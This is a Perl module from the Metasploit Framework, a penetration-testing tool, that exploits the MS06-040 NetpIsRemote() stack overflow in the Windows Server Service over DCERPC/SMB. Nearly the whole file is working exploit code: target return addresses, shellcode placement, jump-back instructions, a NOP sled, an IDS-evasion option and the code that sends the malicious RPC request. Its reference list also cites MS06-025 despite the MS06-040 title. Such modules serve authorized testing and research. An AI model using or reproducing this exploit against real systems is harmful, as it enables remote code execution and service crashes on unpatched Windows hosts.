
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::srvsvc_ms06_040;
use base "Msf::Exploit";
use strict;

use Pex::DCERPC;
use Pex::NDR;

my $advanced = {
	'FragSize'    => [ 256, 'The DCERPC fragment size' ],
	'BindEvasion' => [ 0,   'IDS Evasion of the bind request' ],
	'DirectSMB'   => [ 0,   'Use direct SMB (445/tcp)' ],
  };

my $info = {
	'Name'    => 'Microsoft NetpIsRemote() MSO6-040 Overflow',
	'Version' => '$Revision$',
	'Authors' =>
	  [
		'H D Moore <hdm [at] metasploit.com>',
		'Anonymous',
	  ],

	'Arch' => ['x86'],
	'OS'   => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv' => 1,

	'AutoOpts' => { 'EXITFUNC' => 'thread' },
	
	'UserOpts' =>
	  {
		'RHOST' => [ 1, 'ADDR', 'The target address' ],

		# SMB connection options
		'SMBUSER' => [ 0, 'DATA', 'The SMB username to connect with', '' ],
		'SMBPASS' => [ 0, 'DATA', 'The password for specified SMB username', '' ],
		'SMBDOM'  => [ 0, 'DATA', 'The domain for specified SMB username', '' ],
	  },

	'Payload' =>
	  {
		'Space'    => 538,
		'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
		'Keys'     => ['+ws2ord'],

		# sub esp, 4097 + inc esp makes stack happy
		'Prepend' => "\x81\xc4\xff\xef\xff\xff\x44",
	  },

	'Description' => Pex::Text::Freeform(
		qq{
        This module exploits a stack overflow in the NetApi32 NetpIsRemote() function
		using the NetpwPathCanonicalize RPC call in the Server Service. It is likely that
		other RPC calls could be used to exploit this service. This exploit will result in
		a denial of service on on Windows XP SP2 or Windows 2003 SP1. A failed exploit attempt
		will likely result in a complete reboot on Windows 2000 and the termination of all 
		SMB-related services on Windows XP.
	  }
	  ),

	'Refs' =>
	  [
		[ 'BID', '18325' ],
		[ 'CVE', '2006-2370' ],
		[ 'MSB', 'MS06-025' ],
		[ 'OSVDB', '26437' ],
	  ],

	'DefaultTarget' => 0,
	'Targets'       =>
	  [
		[ 'Windows 2000 SP4 | Windows XP SP0/SP1', 0x717564b8, 0x71ab1d54 ],
		[ 'Windows 2000 English SP0-SP4', 0x74b42f39 ], # jmp esp (alrsvc.dll)
		[ 'Windows 2000 French SP0-SP4',  0x74ac2f39 ], # jmp esp (alrsvc.dll)
	  ],

	'Keys' => ['srvsvc'],

	'DisclosureDate' => 'Aug 08 2006',
  };

sub new {
	my ($class) = @_;
	my $self =
	  $class->SUPER::new( { 'Info' => $info, 'Advanced' => $advanced }, @_ );
	return ($self);
}

sub Exploit {
	my ($self)      = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target_name = '*SMBSERVER';

	my $FragSize = $self->GetVar('FragSize') || 256;
	my $target   = $self->Targets->[$target_idx];

	my ( $res, $rpc );

	if ( !$self->InitNops(128) ) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $pipe    = '\BROWSER';
	my $uuid    = '4b324fc8-1670-01d3-1278-5a47bf6ee188';
	my $version = '3.0';

	my $handle = Pex::DCERPC::build_handle( $uuid, $version, 'ncacn_np', $target_host, $pipe );

	my $dce = Pex::DCERPC->new(
		'handle'      => $handle,
		'username'    => $self->GetVar('SMBUSER'),
		'password'    => $self->GetVar('SMBPASS'),
		'domain'      => $self->GetVar('SMBDOM'),
		'fragsize'    => $self->GetVar('FragSize'),
		'bindevasion' => $self->GetVar('BindEvasion'),
		'directsmb'   => $self->GetVar('DirectSMB'),
	  );

	if ( !$dce ) {
		$self->PrintLine("[*] Could not bind to $handle");
		return;
	}

	my $smb = $dce->{'_handles'}{$handle}{'connection'};
	
	if (! $smb) {
		$self->PrintLine("[*] Could not establish SMB session");
		return;
	}
	

	#
	# There are (at least) two ways to exploit this:
	# 1) Prepend the path with \\ and use stack overflow with a jump to esp
	# 2) Do not prepend with \\ and use strcpy() to copy data to location and then jump to it
	#
	
	
	
	# Allow 2000/XP combined targets :-)
	my @rets = ($target->[2] ? ($target->[1], $target->[2]) : ($target->[1], $target->[1]));
	
	# The ugly path containing multiple return addresses and jumps
	# Most of this work was by <anonymous>
	my $path = 
		"\x5c\x00\x5c\x00".             # Unicode \\
		$shellcode.                     # The actual payload
		pack('V', $rets[0]).            # Windows 2000 SP4 w/o URP1
		Pex::Text::AlphaNumText(20).    # Padding
		"\xe9\xc9\xfd\xff\xff".         # Jump back to payload
		Pex::Text::AlphaNumText(41).    # Padding
		pack('V', $rets[1]).            # Windows XP SP0
		Pex::Text::AlphaNumText(2).     # Padding
		pack('V', $rets[0]).            # Windows 2000 SP4 URP1
		Pex::Text::AlphaNumText(13).    # Padding
		$self->MakeNops(7).             # Nop sled for XP SP0
		"\xe9\x7d\xfd\xff\xff".         # Jump back to payload
		Pex::Text::AlphaNumText(13).    # Padding
		pack('V', $rets[1]).            # Windows XP SP1
		Pex::Text::AlphaNumText(20).    # Padding
		"\xe9\x53\xfd\xff\xff".         # Jump back to payload
		Pex::Text::AlphaNumText(1).     # Padding
		"\x00\x00";                     # NULL terminator
		
	#
	#  /* Function 0x1f at 0x767e912c */
	#  long function_1f (
	#    [in] [unique] [string] wchar_t * arg_00,
	#    [in] [string] wchar_t * arg_01,
	#    [out] [size_is(arg_03)] char * arg_02,
	#    [in] [range(0, 64000)] long arg_03,
	#    [in] [string] wchar_t * arg_04,
	#    [in,out] long * arg_05,
	#    [in] long arg_06
	#  );
	#

	my $stub =
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::UnicodeConformantVaryingString('').
	  Pex::NDR::UnicodeConformantVaryingStringPreBuilt($path).
	  Pex::NDR::Long(10).
	  Pex::NDR::UnicodeConformantVaryingString('').
	  Pex::NDR::Long(1).
	  Pex::NDR::Long(0);

	$self->PrintLine("[*] Sending request...");
	my @response = $dce->request( $handle, 0x1F, $stub );
	if (@response) {
		$self->PrintLine('[*] RPC server responded with:');
		foreach my $line (@response) {
			$self->PrintLine( '[*] ' . $line );
		}
		$self->PrintLine('[*] No response from the target...');
	}

	return;
}

1;
